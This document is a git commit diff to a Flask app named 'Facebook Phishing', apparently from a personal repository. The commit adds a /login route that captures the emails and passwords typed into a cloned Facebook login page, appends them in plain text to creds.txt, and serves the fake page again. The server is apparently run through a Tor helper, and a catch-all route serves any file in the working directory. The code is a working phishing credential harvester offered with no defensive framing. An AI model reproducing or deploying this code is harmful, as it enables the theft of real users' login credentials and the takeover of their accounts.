c4fb740a1e1c0fade12e09815ee05aa894e50db5
imvickykumar999 <imvickykumar999@gmail.com>
2023-10-04 19:01:49 +0530

    creds

--- Projects/Facebook Phishing/app.py
+++ Projects/Facebook Phishing/app.py
@@ -3,16 +3,37 @@
 import VicksTor
 VicksTor.run_server('flask')
 
-from flask import Flask, render_template, send_from_directory
+from flask import (
+    Flask, 
+    request, 
+    render_template, 
+    send_from_directory
+)
 app = Flask(__name__)
 
-@app.route('/templates/Facebook_files/<path:filename>')  
+def save_creds(email, password):
+    with open('creds.txt', 'a') as f:
+        f.write(f'''
+email : {email}
+password : {password}
+''')
+
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form.get("email", False)
+    password = request.form.get("password", False)
+
+    # email = request.form['email']
+    save_creds(email, password)
+    return render_template('Facebook.html')
+
+@app.route('/<path:filename>')  
 def send_file(filename):
-    return send_from_directory('./templates/Facebook_files', filename)
+    return send_from_directory('./', filename)
 
 @app.route('/')
 def hello_world():
     return render_template('Facebook.html')
 
 if __name__ == '__main__':
-    app.run()
+    app.run(debug = False)
